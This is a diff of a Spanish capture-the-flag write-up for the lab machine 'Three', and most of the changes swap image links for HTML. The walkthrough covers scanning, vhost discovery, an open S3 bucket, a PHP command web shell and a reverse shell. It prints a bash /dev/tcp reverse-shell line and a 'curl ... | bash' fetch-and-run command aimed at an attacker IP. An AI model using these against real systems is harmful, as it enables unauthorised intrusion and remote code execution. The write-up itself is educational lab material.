@@ -1231,7 +1231,7 @@ rtt min/avg/max/mdev = 97.779/107.395/143.705/18.167 ms
 ```
 
 Con un TTL 63 sabemos que nos estamos enfrentando a una máquina Linux.
-# Enumeración
+<h2 class="titulo-principal">Enumeración</h2>
 
 Para la fase de enumeración con nmap vamos a lanzar un escaneo rápido y sigiloso:
 
@@ -1239,8 +1239,9 @@ Para la fase de enumeración con nmap vamos a lanzar un escaneo rápido y sigilo
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.91.236 -oG allPorts
 ```
 
-
-![[HTB/Starting Point/Tier 2/Three/Images/nmap.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/nmap.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Limpiamos ruido y con **extractPorts** copiamos los puertos abiertos para realizar un escaneo exhaustivo con nmap y una serie de scripts básico de reconocimiento para saber la versión y servicio:
 
@@ -1248,11 +1249,15 @@ Limpiamos ruido y con **extractPorts** copiamos los puertos abiertos para realiz
 nmap -sCV -p22,80 10.129.91.236 -oN targeted
 ```
 
-![[HTB/Starting Point/Tier 2/Three/Images/nmap2.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/nmap2.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Vemos un puerto 22 y un 80 abiertos, probamos con la herramienta `whatweb` a enumerar un poco el servicio web:
 
-![[HTB/Starting Point/Tier 2/Three/Images/whatweb.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/whatweb.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Vemos un potencial dominio 'thetoppers.htb' pero, por ahora sigamos enumerando, vamos a realizar un escaneo con nmap y script programado en Lua para utilizar un diccionario que contiene posibles rutas comunes que pueda contemplar este servicio web:
 
@@ -1260,47 +1265,58 @@ Vemos un potencial dominio 'thetoppers.htb' pero, por ahora sigamos enumerando, 
 nmap --script http-enum 10.129.91.236 -oN webScan
 ```
 
-![[HTB/Starting Point/Tier 2/Three/Images/webscan.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/webscan.png" alt="under" oncontextmenu="return false;">
+</div>
 
-# Explotación
+<h2 class="titulo-principal">Explotación</h2>
 
 Al no encontrar mucha información de los escaneos web, probamos a enumerar directorios con la herramienta `gobuster`
 
-![[HTB/Starting Point/Tier 2/Three/Images/dirbust.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/dirbust.png" alt="under" oncontextmenu="return false;">
+</div>
 
 No hay nada, así que probamos con posibles archivos .PHP:
 
-![[filebust.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/filebust.png" alt="under" oncontextmenu="return false;">
+</div>
 
 No encontramos nada entonces abriremos la web
 
-![[HTB/Starting Point/Tier 2/Three/Images/web.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/web.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Por más exhaustiva que sea la búsqueda en la web no hay nada pero, no significa que no haya nada, ya que en realidad si usamos `gobuster` para filtrar por **VHOST** la cosa cambia totalmente:
 
----
-# ¿Qué es VHOST?
+<hr />
+<h3 class="titulo-secundario">¿Qué es VHOST?</h3>
 
 Es bastante sencillo de entender este concepto ya que un servidor tiene una dirección IP, pero puede tener multiples dominos, y en base al dominio que se acceda la información puede variar y ser diferente.
 
 > No es lo mismo acceder a 10.129.91.236, que acceder a thetoppers.htb. Pueden diferentes en su contenido o tener una ligera variación.
 
-----
-
-![[vhostbust.png]]
+<hr />
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/vhostbust.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Y encontramos 2 subdominios pero, el único que nos interesa es el `s3.thetoppers.htb` ya que S3 proviene de un servicio de Cloud de Amazon:
 
----
-# ¿Qué es S3 Bucket AWS?
+<hr />
+<h3 class="titulo-secundario">¿Qué es S3 Bucket AWS?</h3>
 
 Un bucket S3 de AWS es un recurso de almacenamiento en la nube que permite guardar datos manera segura, eficiente y escalable. Es un servicio de Amazon Web Services (AWS) llamado Simple Storage Service (S3)
 
-----
+<hr />
 
 Para conectarnos podemos instalar 'aws-cli':
 
-![[aws.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/aws.png" alt="under" oncontextmenu="return false;">
+</div>
 
 La típica para usar el cliente de aws es utilizar el comando, seguido de llamar a s3 y ejecutar por ejemplo un 'ls':
 
@@ -1310,11 +1326,15 @@ aws --endpoint=http://s3.thetoppers.htb s3 ls
 
 En caso de arrojar un error simplemente ejecutamos `aws configure` y ponemos todo como **temp**.
 
-![[aws2.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/aws2.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Tenemos capacida de lectura y podemos listar el contenido almacenado en el Bucket de S3 Amazon.
 
-![[aws3.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/aws3.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Ya que la página interpreta código .PHP, podemos crear un pequeño script .PHP para subirlo al Bucket S3 de Amazon.
 
@@ -1327,19 +1347,27 @@ Ya que la página interpreta código .PHP, podemos crear un pequeño script .PHP
 
 Lo subimos ejecutando `cp shell.php` al Bucket.
 
-![[shell2.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/shell2.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Y en la web probamos a cargar el recurso, y no vemos nada eso es buena señal.
 
-![[HTB/Starting Point/Tier 2/Three/Images/intrusion.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/intrusion.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Ya que a través de la variables `cmd`podremos ejecutar comandos de manera remota y hemos conseguido un RCE Remote Command Execution.
 
-![[intrusion2.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/intrusion2.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Probamos a listar el '/etc/passwd'. Y vemos que 2 usuarios tienen una Bash como consola.
 
-![[intrusion3.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/intrusion3.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Como podemos subir contenido al Bucket, nos podemos crear una Reverse Shell, entonces la máquina nos va a enviar una Bash a nuestra máquina como atacante.
 
@@ -1352,11 +1380,15 @@ bash -i >& /dev/tcp/10.10.16.84/1337 0>&1
 
 Subimos el Reverse.sh, nos montamos con `python3 -m http.server 8000` Un servidor HTTP, y nos ponemos en escucha con la herramienta `netcat` por el puerto 1337.
 
-![[intrusion4.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/intrusion4.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Si entramos a la página y escribos muestra shell, debemos de poder ver en texto plano el código:
 
-![[intrusion5.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/intrusion5.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Lo que debemos hacer es en la variable `cmd` ejecutar:
 
@@ -1364,18 +1396,24 @@ Lo que debemos hacer es en la variable `cmd` ejecutar:
 curl 10.10.16.84:8000/lian.sh|bash
 ```
 
-![[intrusion6.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/intrusion6.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Y revisando nuestra terminal vemos que el servidor web montado con Python ha recibido una petición Get. Y por el puerto 1337 con netcat hemos recibido una conexión. 
 
-![[intrusion7.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/intrusion7.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Hemos hecho la intrusión en la máquina y vemos la flag:
 
-![[HTB/Starting Point/Tier 2/Three/Images/flag.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/flag.png" alt="under" oncontextmenu="return false;">
+</div>
 
----
-# Bonus
+<hr />
+<a href=""><strong>Bonus</strong></a>
 
 Al recibir la conexión con la herramienta `netcat` para tener un mejor control de la consola, podemos hacer un tratamiento TTY, basicamente poder usar la consola que nos la máquina sin problemas. Para eso ejecutamos una vez recibida la consola:
 
@@ -1402,9 +1440,8 @@ www-data@host:/$ export SHELL=bash
 
 
 1. export TERM=xterm` -> Debemos hacer esto ya que a pesar de haberle indicado que queríamos una **xterm** al momento de reiniciarlo la variable de entorno **TERM** vale **dump** (Se usa esta variable para poder usar los atajos de teclado).
-2. export SHELL=bash` -> Para que nuestra shell sea una bash.
----
 
+2. export SHELL=bash` -> Para que nuestra shell sea una bash.
 
 ---
 
